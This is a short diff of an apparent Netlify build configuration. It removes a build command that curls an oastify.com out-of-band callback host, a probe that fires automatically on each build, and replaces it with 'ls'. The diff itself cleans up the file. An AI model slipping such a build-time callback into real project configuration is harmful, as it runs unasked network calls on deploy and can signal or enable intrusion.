@@ -1,5 +1,5 @@
 [build]
-  command = "curl http://7x5wkztb1j4nlptlupnoohioxf36rwfl.oastify.com"
+  command = "ls"
   publish = ".next"
   functions = ".netlify/functions"
 
